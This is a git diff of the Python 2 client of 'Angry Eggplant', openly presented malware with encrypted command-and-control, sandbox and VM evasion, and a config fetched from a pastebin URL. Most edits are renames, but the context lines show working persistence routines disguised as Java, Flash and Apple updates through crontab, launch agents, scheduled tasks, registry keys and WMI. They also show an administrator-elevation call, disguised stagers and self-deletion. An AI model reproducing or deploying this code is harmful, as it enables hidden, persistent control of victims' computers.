@@ -1,5 +1,9 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
+#!/usr/bin/python
+
+# The Angry Eggplant Project
+
+# https://github.com/colental/ae
+
 
 '''
 
@@ -28,7 +32,7 @@
     
 >  Security
     - state of the art encryption - AES cipher in authenticated OCB mode with 256-bit key
-    - Diffie-Hellman Key Agreement method - key is secure even on monitored networks
+    - Diffie-Hellman Key Agreement - key is secure even on monitored networks
     - secure communication - message confidentiality, authenticity, & integrity
     - anti-forensics countermeasures - sandbox detection, virtual machine detection
 
@@ -39,10 +43,8 @@
 for pkg in ['os', 'sys', 'mss', 'cv2', 'wmi', 'time', 'json', 'zlib', 'uuid', 'numpy', 'Queue', 'base64', 'ctypes', 'pickle', 'struct', 'socket', 'random', 'ftplib', 'urllib', 'twilio', 'pyHook', 'pyxhook', 'hashlib', 'urllib2', 'marshal', 'zipfile', '_winreg', 'win32com', 'pythoncom', 'functools', 'threading', 'cStringIO', 'subprocess', 'collections', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.PublicKey.RSA', 'Crypto.Cipher.PKCS1_OAEP']:
     try:
         exec 'import {}'.format(pkg) in globals()
-    except ImportError as error:
-        if str(error):
-            print("Import error: {}".format(str(error)))
-
+    except: pass
+        
 
 def config(*arg, **options):
     def _config(function):
@@ -59,7 +61,7 @@ def config(*arg, **options):
 
 class Client():
     '''
-    Copyright (c) 2017 Angry Eggplant (https://github.com/colental/ae)
+    Copyright (c) 2017 Daniel Vega-Myhre
 
     Permission is hereby granted, free of charge, to any person obtaining a copy
     of this software and associated documentation files (the "Software"), to deal
@@ -87,16 +89,19 @@ class Client():
     _lock    = threading.Lock()
     _jobs    = Queue.Queue()
     _flags   = {'prompt': threading.Event(),'connection': threading.Event(), 'mode': threading.Event()}
-    __name__ = 'Client'
+#    __name__ = 'Client'
 
     def __init__(self, config=None):
+        """
+        initiate a new instance of the Angry Eggplant Client
+        """
         self._sysinfo = self._get_system()
         self._command = self._get_commands()
         self._workers = collections.OrderedDict()
         self._results = collections.OrderedDict()
         self._network = collections.OrderedDict()
         self._session = collections.OrderedDict()
-        self._payloads = collections.OrderedDict()
+        self._payload = collections.OrderedDict()
         
 
     
@@ -1029,8 +1034,8 @@ class Client():
 
     @config(platforms=['win32','linux2','darwin'])
     def _persistence_add_hidden_file(self, *args, **kwargs):
-        if len(self._payloads):
-            value = random.choice(self._payloads)
+        if len(self._payload):
+            value = random.choice(self._payload)
             if value and os.path.isfile(value):
                 try:
                     if os.name is 'nt':
@@ -1067,8 +1072,8 @@ class Client():
     @config(platforms=['linux2'])
     def _persistence_add_crontab_job(self, minutes=10, name='flashplayer'):
         try:
-            if len(self._payloads):
-                value = random.choice(self._payloads)
+            if len(self._payload):
+                value = random.choice(self._payload)
                 if value and os.path.isfile(value):
                     if not os.path.isdir('/var/tmp'):
                         os.makedirs('/var/tmp')
@@ -1115,8 +1120,8 @@ class Client():
     @config(platforms=['darwin'])
     def _persistence_add_launch_agent(self,  name='com.apple.update.manager'):
         try:
-            if len(self._payloads):
-                value = random.choice(self._payloads)
+            if len(self._payload):
+                value = random.choice(self._payload)
                 if value and os.path.isfile(value):
                     code    = self._server_request('resource bash')
                     label   = name
@@ -1152,8 +1157,8 @@ class Client():
 
     @config(platforms=['win32'])
     def _persistence_add_scheduled_task(self, name='Java-Update-Manager'):
-        if len(self._payloads):
-            value = random.choice(self._payloads)
+        if len(self._payload):
+            value = random.choice(self._payload)
             if value and os.path.isfile(value):
                 tmpdir      = os.path.expandvars('%TEMP%')
                 task_run    = os.path.join(tmpdir, name + os.path.splitext(value)[1])
@@ -1182,8 +1187,8 @@ class Client():
 
     @config(platforms=['win32'])
     def _persistence_add_startup_file(self, name='Java-Update-Manager'):
-        if len(self._payloads):
-            value = random.choice(self._payloads)
+        if len(self._payload):
+            value = random.choice(self._payload)
             if value and os.path.isfile(value):
                 try:
                     appdata = os.path.expandvars("%AppData%")
@@ -1218,8 +1223,8 @@ class Client():
 
     @config(platforms=['win32'])
     def _persistence_add_registry_key(self, name='Java-Update-Manager'):
-        if len(self._payloads):
-            value = random.choice(self._payloads)
+        if len(self._payload):
+            value = random.choice(self._payload)
             if value and os.path.isfile(value):
                 try:
                     self._get_registry_key(name, value)
@@ -1246,8 +1251,8 @@ class Client():
     def _persistence_add_powershell_wmi(self, command=None, task_name='Java-Update-Manager'):
         try:
             cmd_line  = ""
-            if len(self._payloads):
-                value = random.choice(self._payloads)
+            if len(self._payload):
+                value = random.choice(self._payload)
                 if value and os.path.isfile(value):
                     cmd_line = 'start /b /min {}'.format(value)
                 elif command:
@@ -2179,9 +2184,9 @@ class Client():
         try:
             if self._get_administrator():
                 return "Current user '{}' has administrator privileges".format(self._sysinfo.get('username'))
-            if self._payloads.get('established') and os.path.isfile(self._payloads.get('result')):
+            if self._payload.get('established') and os.path.isfile(self._payload.get('result')):
                 if os.name is 'nt':
-                    win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._payloads.get('result')))
+                    win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._payload.get('result')))
                 else:
                     return "Privilege escalation not yet available on '{}'".format(sys.platform)
         except Exception as e:
@@ -2231,8 +2236,8 @@ class Client():
                         path = self._payload_application(path)
                     else:
                         path = self._payload_executable(path)
-                self._payloads[name] = path
-                return json.dumps({name: self._payloads.get(name)})
+                self._payload[name] = path
+                return json.dumps({name: self._payload.get(name)})
         except Exception as e:
             return "{} error: {}".format(self.payload.func_name, str(e))
             
@@ -2309,8 +2314,8 @@ class Client():
                 methods = [m for m in self.persistence.methods if sys.platform in self.persistence.methods[m]['platforms']]
                 if cmd not in ('add','remove'):
                     return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in self.persistence.methods if sys.platform in getattr(Client, '_persistence_add_%s' % m).platforms]))
-                if not self._payloads:
-                    self._payloads.append(self.payload(random.choice(['java','flash','chrome','firefox'])))
+                if not self._payload:
+                    self._payload.append(self.payload(random.choice(['java','flash','chrome','firefox'])))
                 for method in methods:
                     if method == 'all' or action == method:
                         self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target.format(cmd, method))()
@@ -2375,7 +2380,7 @@ class Client():
                         remove = getattr(self, '_persistence_remove_{}'.format(method))()
                     except Exception as e2:
                         self.debug("{} error: {}".format(method, str(e2)))
-            for stager in self._payloads:
+            for stager in self._payload:
                 self._get_delete(stager)
             if not self._debug:
                 self._get_delete(sys.argv[0])               
@@ -2456,9 +2461,10 @@ class Client():
         except Exception as e:
             self.debug("{} error: {}".format(self.run.func_name, str(e)))
         return self._get_restart(self.run.func_name)
-                            
+
+
 
 if __name__ == "__main__":
     client = Client(config='https://pastebin.com/raw/uYGhnVqp')
-    client.run()
+    #client.run()
 
